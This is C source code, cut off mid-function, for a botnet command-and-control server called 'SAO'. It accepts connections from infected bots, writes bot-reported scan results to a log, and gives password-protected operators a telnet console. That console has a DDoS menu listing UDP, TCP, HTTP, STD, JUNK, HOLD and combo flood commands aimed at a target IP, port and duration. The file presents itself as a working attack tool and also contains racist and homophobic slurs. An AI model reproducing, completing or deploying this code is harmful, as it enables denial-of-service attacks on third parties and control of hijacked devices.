/*
                        ,---.   
  .--.--.                '   ,'\  
 /  /    '    ,--.--.   /   /   | 
|  :  /`./   /       \ .   ; ,. : 
|  :  ;_    .--.  .-. |'   | |: : 
 \  \    `.  \__\/: . .'   | .; : 
  `----.   \ ," .--.; ||   :    | 
 /  /`--'  //  /  ,.  | \   \  /  
'--'.     /;  :   .'   \ `----'   
  `--'---' |  ,     .-./          
            `--`---'              
                Server Side *Leeched* By Root Senpai
-------------------------------------------
Banners: sao, senpai, kirito and asuna
make sure login file name is login.txt


*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>

#define MAXFDS 1000000
#define RED     "\x1b[0;31m"
#define GREEN   "\x1b[0;32m"
#define C_RESET   "\x1b[0m"

struct account {
char id[20];
char password[20];
};
static struct account accounts[10]; //max users is set on 50
struct clientdata_t {
        uint32_t ip;
        char build[7];
        char connected;
} clients[MAXFDS];
struct telnetdata_t {
        int connected;
} managements[MAXFDS];
////////////////////////////////////
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;
////////////////////////////////////
int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}
void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd)
{
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        s = fcntl (sfd, F_SETFL, flags); 
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}
static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "STOP USING IRELIVANT PORTS\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[31m", 5, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                //printf("sent to fd: %d\n", i);
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[1;33m~$ \x1b[1;33m", 13, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *epollEventLoop(void *useless)
{
        struct epoll_event event;
        struct epoll_event *events;
        int s;
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;
                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len);
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                                                else
                                                {
                                                        perror ("accept");
                                                        break;
                                                }
                                        }
                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
                                        int dup = 0;
                                        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
                                        {
                                                if(!clients[ipIndex].connected || ipIndex == infd) continue;
                                                if(clients[ipIndex].ip == clients[infd].ip)
                                                {
                                                        dup = 1;
                                                        break;
                                                }
                                        }
 
                                        if(dup) 
                                        {                  
                                                if(send(infd, "- GTFONIGGER\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                                                if(send(infd, "- GTFOFAG\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                                                if(send(infd, "- GTFODUP\n\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                                                if(send(infd, "- DUPES\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                                                if(send(infd, "- GTFOPUSSY\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                                                if(send(infd, "- LOLNOGTFO\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                                                close(infd);
                                                continue;
                                        }
 
                                        s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; }
 
                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break;
                                        }
 
                                        clients[infd].connected = 1;
                                        
                                }
                                continue;
                        }
                        else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);
 
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; }
                                                trim(buf);
                                                if(strcmp(buf, "PING") == 0) 
                                                {
                                                if(send(thefd, "pOnG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } 
                                                        continue;
                                                }
                                                if(strstr(buf, "REPORT ") == buf) 
                                                {
                                                        char *line = strstr(buf, "REPORT ") + 7; 
                                                        fprintf(telFD, "%s\n", line); 
                                                        fflush(telFD);
                                                        TELFound++;
                                                        continue;
                                                }
                                                if(strstr(buf, "PROBING") == buf)
                                                {
                                                        char *line = strstr(buf, "PROBING");
                                                        scannerreport = 1;
                                                        continue;
                                                }
                                                if(strstr(buf, "REMOVING PROBE") == buf)
                                                {
                                                        char *line = strstr(buf, "REMOVING PROBE");
                                                        scannerreport = 0;
                                                        continue;
                                                }
                                                if(strcmp(buf, "pOnG") == 0)
                                                {
                                                        continue;
                                                }
 
                                                printf("\"%s\"\n", buf);
                                        }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}
unsigned int clientsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total*1;
}
void *titleWriter(void *sock) 
{
        int thefd = (int)sock;
        char string[2048];
        while(1)
        {
                memset(string, 0, 2048);
                sprintf(string, "%c]0; [+] SAO Sleaves: %d [-] SwordMens: %d [+]%c", '\033', clientsConnected(), managesConnected, '\007');
                if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
 
                sleep(3);
        }
}
 
int Search_in_File(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];
 
    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
 
    if(find_result == 0)return 0;
 
    return find_line;
}
 void client_addr(struct sockaddr_in addr){
        printf("IP:%d.%d.%d.%d\n",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        FILE *logFile;
        logFile = fopen("server.log", "a");
        fprintf(logFile, "\nIP:%d.%d.%d.%d ",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile);
}

void *telnetWorker(void *sock)
{
        char usernamez[80];
        int thefd = (int)sock;
        int find_line;
        managesConnected++;
        pthread_t title;
        char counter[2048];
        memset(counter, 0, 2048);
        char buf[2048];
        char* nickstring;
        char* username;
        char* password;
        memset(buf, 0, sizeof buf);
        char botnet[2048];
        memset(botnet, 0, 2048);
        
        FILE *fp;
        int i=0;
        int c;
        fp=fopen("login.txt", "r"); 
        while(!feof(fp)) 
        {
                c=fgetc(fp);
                ++i;
        }
        int j=0;
        rewind(fp);
        while(j!=i-1) 
        {
            fscanf(fp, "%s %s", accounts[j].id, accounts[j].password);
            ++j;
        }
        
        if(send(thefd, "\x1b[37mSAO User: \x1b[37m", 23, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        sprintf(usernamez, buf);
        nickstring = ("%s", buf);
        find_line = Search_in_File(nickstring);
        if(strcmp(nickstring, accounts[find_line].id) == 0){    
        if(send(thefd, "\x1b[36m*           LOADING SAO world        *\r\n", 49, MSG_NOSIGNAL) == -1) goto end;  
        if(send(thefd, "\x1b[1;35mSAO Pass: \x1b[1;37m", 23, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto fak;
        }
        failed:
        if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[36m************************************\r\n", 44, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[0;35m*  gtfo out of my world bitch!   *\r\n", 44, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[36m************************************\r\n", 43, MSG_NOSIGNAL) == -1) goto end;
            sleep(5);
        goto end;
        fak:

        Title:
        pthread_create(&title, NULL, &titleWriter, sock);
        char ascii_banner_line1 [5000];
        char ascii_banner_line2 [5000];
        char ascii_banner_line3 [5000];
        char ascii_banner_line4 [5000];
        char ascii_banner_line5 [5000];
		char ascii_banner_line6 [5000];
		char ascii_banner_line7 [5000];
		char ascii_banner_line8 [5000];

        char Wline2 [80];
        char Wline3 [80];
        
		sprintf(ascii_banner_line1, "\x1b[1;35m                   ██████  ▄▄▄       \x1b[1;36m▒\x1b[1;35m█████   \r\n");
		sprintf(ascii_banner_line2, "\x1b[1;36m                  ▒\x1b[1;35m██    \x1b[1;36m▒ ▒\x1b[1;35m████▄    \x1b[1;36m▒\x1b[1;35m██\x1b[1;36m▒  \x1b[1;35m██\x1b[1;36m▒\r\n");
        sprintf(ascii_banner_line3, "\x1b[1;36m                  ░ ▓\x1b[1;35m██▄   \x1b[1;36m▒\x1b[1;35m██  ▀█▄  \x1b[1;36m▒\x1b[1;35m██\x1b[1;36m░  \x1b[1;35m██\x1b[1;36m▒\r\n");
        sprintf(ascii_banner_line4, "\x1b[1;36m                    ▒   \x1b[1;35m██\x1b[1;36m▒░\x1b[1;35m██▄▄▄▄██ \x1b[1;36m▒\x1b[1;35m██   ██\x1b[1;36m░\r\n");
        sprintf(ascii_banner_line5, "\x1b[1;36m                  ▒\x1b[1;35m██████\x1b[1;36m▒▒ ▓\x1b[1;35m█   \x1b[1;36m▓\x1b[1;35m██\x1b[1;36m▒░ \x1b[1;35m████\x1b[1;36m▓▒░\r\n");
        sprintf(ascii_banner_line6, "\x1b[1;36m                  ▒ ▒▓▒ ▒ ░ ▒▒   ▓▒\x1b[1;35m█\x1b[1;36m░░ ▒░▒░▒░ \r\n");
        sprintf(ascii_banner_line7, "\x1b[1;36m                  ░ ░▒  ░ ░  ▒   ▒▒ ░  ░ ▒ ▒░ \r\n");
        sprintf(ascii_banner_line8, "\x1b[1;36m                  ░  ░  ░    ░   ▒   ░ ░ ░ ▒  \r\n");
        sprintf(Wline2, "                        \x1b[1;35mWelcome \x1b[1;37m%s \x1b[1;35mTo SAO\r\n", accounts[find_line].id, buf);
        
        if(send(thefd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Wline2, strlen(Wline2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Wline3, strlen(Wline3), MSG_NOSIGNAL) == -1) goto end;
        while(1) {
        if(send(thefd, "\x1b[1;33mSAO~$ \x1b[1;32m", 13, MSG_NOSIGNAL) == -1) goto end;
        break;
        }
        pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
        
        while(fdgets(buf, sizeof buf, thefd) > 0)
        {
        if(strstr(buf, "news"))
        {
        sprintf(botnet, "nothin...\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "owners"))
        {
        sprintf(botnet, "@root.senpai\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "bots"))
        {  
        sprintf(botnet, "[+] SAO Slaves: %d [-] SwordMens: %d [+]\r\n", clientsConnected(), managesConnected);
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* TCP"))
        {  
        sprintf(botnet, "SAO players slapping with [TCP]\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		}
        if(strstr(buf, "!* HOLD"))
        {  
        sprintf(botnet, "SAO players holding em [HOLD]\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		}
        if(strstr(buf, "!* JUNK"))
        {  
        sprintf(botnet, "dont be a SAO jucky [JUNK]\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		}
        if(strstr(buf, "!* HTTP"))
        {  
        sprintf(botnet, "SAO players running that site [HTTP]\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		}
        if(strstr(buf, "!* STD"))
        {  
        sprintf(botnet, "SAO players slapping with [STD]\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		}
        if(strstr(buf, "!* CNC"))
        {  
        sprintf(botnet, "SAO players fukcing up that net [CNC]\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "!* UDP"))
        {  
        sprintf(botnet, "SAO Sleaves Attacking em sluts [UDP]\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
                        if(strstr(buf, "ports"))
        {  
        sprintf(botnet, "PORTS: 77=TCP 53=DNS 443=NFO/OVH Source Port 22=SSH 80=HTTP PS3/XBOX=3074\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
                        if(strstr(buf, "dev"))
        {  
        sprintf(botnet, "@root.senpai\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "menu")) {
                pthread_create(&title, NULL, &titleWriter, sock);
                char helpline1  [80];
                char helpline2  [80];
                char helpline3  [80];
                char helpline4  [80];
                
                sprintf(helpline1,  "\x1b[1;37mType A Option From Below:\r\n");
                sprintf(helpline2,  "\x1b[1;37mhelp   \x1b[1;31m ~ DDOS Commands\r\n");
                sprintf(helpline3,  "\x1b[1;37mmore \x1b[1;31m ~ Extra Lit Commands\r\n");
                
                if(send(thefd, helpline1,  strlen(helpline1),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline2,  strlen(helpline2),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, helpline3,  strlen(helpline3),   MSG_NOSIGNAL) == -1) goto end;
                pthread_create(&title, NULL, &titleWriter, sock);
                while(1) {
                if(send(thefd, "\x1b[1;33mSAO~$ \x1b[1;32m", 12, MSG_NOSIGNAL) == -1) goto end;
                break;
                }
                continue;
        }
                    if(strstr(buf, "help")) {
                pthread_create(&title, NULL, &titleWriter, sock);
                char ddoshline2 [80];
                char ddoshline1 [80];

                char ddosline1  [80];
                char ddosline2  [80];
                char ddosline3  [80];
                char ddosline4  [80];
                char ddosline5  [80];
                char ddosline6  [80];
                char ddosline7  [80];
                char ddosline8  [80];
                char ddosline9  [80];

                sprintf(ddoshline2, "\x1b[1;32m [+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+]\r\n");
                sprintf(ddoshline1, "\x1b[1;32m [+]                        \x1b[1;37mDDoS Menu                           \x1b[1;32m[+]\r\n");
                sprintf(ddosline1, "\x1b[1;32m [+] \x1b[1;36m!* UDP [IP] [PORT] [TIME] 32 1337 400       | UDP FLOOD    \x1b[1;32m[+]\r\n");
                sprintf(ddosline2, "\x1b[1;32m [+] \x1b[1;36m!* TCP [IP] [PORT] [TIME] 32 all 1337 400   | TCP FLOOD    \x1b[1;32m[+]\r\n");
                sprintf(ddosline3, "\x1b[1;32m [+] \x1b[1;36m!* HTTP [URL] G|H|P [PORT] / [TIME] 1024    | HTTP FLOOD   \x1b[1;32m[+]\r\n");
                sprintf(ddosline4, "\x1b[1;32m [+] \x1b[1;36m!* STD [IP] [PORT] [TIME]                   | STD FLOOD    \x1b[1;32m[+]\r\n");
                sprintf(ddosline5, "\x1b[1;32m [+] \x1b[1;36m!* JUNK [IP] [PORT] [TIME]                  | JUNK FLOOD   \x1b[1;32m[+]\r\n");
                sprintf(ddosline6, "\x1b[1;32m [+] \x1b[1;36m!* HOLD [IP] [PORT] [TIME]                  | HOLD FLOOD   \x1b[1;32m[+]\r\n");
                sprintf(ddosline7, "\x1b[1;32m [+] \x1b[1;36m!* CNC [IP] [PORT] [TIME]                   | COMBO FLOOD  \x1b[1;32m[+]\r\n");
                sprintf(ddosline8, "\x1b[1;32m [+] \x1b[1;36m!* STOPATTK                                 | KILL ATTACKS \x1b[1;32m[+]\r\n");
                sprintf(ddosline9, "\x1b[1;32m [+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+]\r\n");

                if(send(thefd, ddoshline2, strlen(ddoshline2),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, ddoshline1, strlen(ddoshline1),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, ddosline1,  strlen(ddosline1),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, ddosline2,  strlen(ddosline2),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, ddosline3,  strlen(ddosline3),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, ddosline4,  strlen(ddosline4),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, ddosline5,  strlen(ddosline5),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, ddosline6,  strlen(ddosline6),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, ddosline7,  strlen(ddosline7),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, ddosline8,  strlen(ddosline8),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, ddosline9,  strlen(ddosline9),   MSG_NOSIGNAL) == -1) goto end;
                pthread_create(&title, NULL, &titleWriter, sock);
                while(1) {
                if(send(thefd, "\x1b[1;33mSAO~$ \x1b[1;32m", 12, MSG_NOSIGNAL) == -1) goto end;
                break;
                }
                continue;
            
            }
            
            if(strstr(buf, "more")) {
                pthread_create(&title, NULL, &titleWriter, sock);
                char extraline1  [80];
                char extraline2  [80];
                char extraline3  [80];
                char extraline4  [80];
                char extraline5  [80];
                char extraline6  [80];
                char extraline7  [80];
                char extraline8  [80];
                char extraline9  [80];
                char extraline10 [80];
                char extraline11 [80];

                sprintf(extraline1,  "\x1b[35m sao     | sao Clear\r\n");
                sprintf(extraline2,  "\x1b[35m kirito  | kirito Clear\r\n");
                sprintf(extraline3,  "\x1b[35m senpai  | senpai Clear\r\n");
                sprintf(extraline4,  "\x1b[35m asuna   | asuna Clear\r\n");
                sprintf(extraline8,  "\x1b[35m clear   | Clears Screen To Start Banner\r\n");
                sprintf(extraline9,  "\x1b[35m ports   | TO show ports\r\n");
                sprintf(extraline10, "\x1b[35m dev     | TO SEE DEV\r\n");
                sprintf(extraline11, "\x1b[35m bots    | BOT COUNT\r\n");
                
                if(send(thefd, extraline1,  strlen(extraline1), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, extraline2,  strlen(extraline2), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, extraline3,  strlen(extraline3), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, extraline4,  strlen(extraline4), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, extraline8,  strlen(extraline8), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, extraline9,  strlen(extraline9), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, extraline10, strlen(extraline10), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, extraline11, strlen(extraline11), MSG_NOSIGNAL) == -1) goto end;
                pthread_create(&title, NULL, &titleWriter, sock);
                while(1) {
                if(send(thefd, "\x1b[1;33mSAO~$ \x1b[0;32m", 12, MSG_NOSIGNAL) == -1) goto end;
                break;
                }
                continue;
            }

        if(strstr(buf, "sao")){

        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Wline2, strlen(Wline2), MSG_NOSIGNAL) == -1) goto end;
        managements[thefd].connected = 1;
        }
        
        if(strstr(buf, "clear")){
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, Wline2, strlen(Wline2), MSG_NOSIGNAL) == -1) goto end;
        managements[thefd].connected = 1;
        }
        
        if(strstr(buf, "senpai")) {
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        
        char senpai1 [5000];
        char senpai2 [5000];
        char senpai3 [5000];
        char senpai4 [5000];
        char senpai5 [5000];
        char senpai6 [5000];
		char senpai7 [5000];

		sprintf(senpai1,  "\x1b                                                   \r\n");
        sprintf(senpai2,  "\x1b[1;35m  ███████\x1b[1;36m╗\x1b[1;35m███████\x1b[1;36m╗\x1b[1;35m███\x1b[1;36m╗   \x1b[1;35m██\x1b[1;36m╗\x1b[1;35m██████\x1b[1;36m╗  \x1b[1;35m█████\x1b[1;36m╗ \x1b[1;35m██\x1b[1;36m╗\r\n");
        sprintf(senpai3,  "\x1b[1;35m  ██\x1b[1;36m╔════╝\x1b[1;35m██\x1b[1;36m╔════╝\x1b[1;35m████\x1b[1;36m╗  \x1b[1;35m██\x1b[1;36m║\x1b[1;35m██\x1b[1;36m╔══\x1b[1;35m██\x1b[1;36m╗\x1b[1;35m██\x1b[1;36m╔══\x1b[1;35m██\x1b[1;36m╗\x1b[1;35m██\x1b[1;36m║\r\n");
        sprintf(senpai4,  "\x1b[1;35m  ███████\x1b[1;36m╗\x1b[1;35m█████\x1b[1;36m╗  \x1b[1;35m██\x1b[1;36m╔\x1b[1;35m██\x1b[1;36m╗ \x1b[1;35m██\x1b[1;36m║\x1b[1;35m██████\x1b[1;36m╔╝\x1b[1;35m███████\x1b[1;36m║\x1b[1;35m██\x1b[1;36m║\r\n");
        sprintf(senpai5,  "\x1b[1;36m  ╚════\x1b[1;35m██\x1b[1;36m║\x1b[1;35m██\x1b[1;36m╔══╝  \x1b[1;35m██\x1b[1;36m║╚\x1b[1;35m██\x1b[1;36m╗\x1b[1;35m██\x1b[1;36m║\x1b[1;35m██\x1b[1;36m╔═══╝ \x1b[1;35m██\x1b[1;36m╔══\x1b[1;35m██\x1b[1;36m║\x1b[1;35m██\x1b[1;36m║\r\n");
        sprintf(senpai6,  "\x1b[1;35m  ███████\x1b[1;36m║\x1b[1;35m███████\x1b[1;36m╗\x1b[1;35m██\x1b[1;36m║ ╚\x1b[1;35m████\x1b[1;36m║\x1b[1;35m██\x1b[1;36m║     \x1b[1;35m██\x1b[1;36m║  \x1b[1;35m██\x1b[1;36m║\x1b[1;35m██\x1b[1;36m║\r\n");
        sprintf(senpai7,  "\x1b[1;36m  ╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝╚═╝\r\n");
		
        if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, senpai1, strlen(senpai1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, senpai2, strlen(senpai2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, senpai3, strlen(senpai3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, senpai4, strlen(senpai4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, senpai5, strlen(senpai5), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, senpai6, strlen(senpai6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, senpai7, strlen(senpai7), MSG_NOSIGNAL) == -1) goto end;
        while(1) {
        if(send(thefd, "\x1b[1;33mSAO~$ \x1b[1;32m", 12, MSG_NOSIGNAL) == -1) goto end;
        break;
        }
        continue;
        
        }

		
        if(strstr(buf, "asuna")){
        char asuna_banner1  [5000];
        char asuna_banner2  [5000];
        char asuna_banner3  [5000];
        char asuna_banner4  [5000];
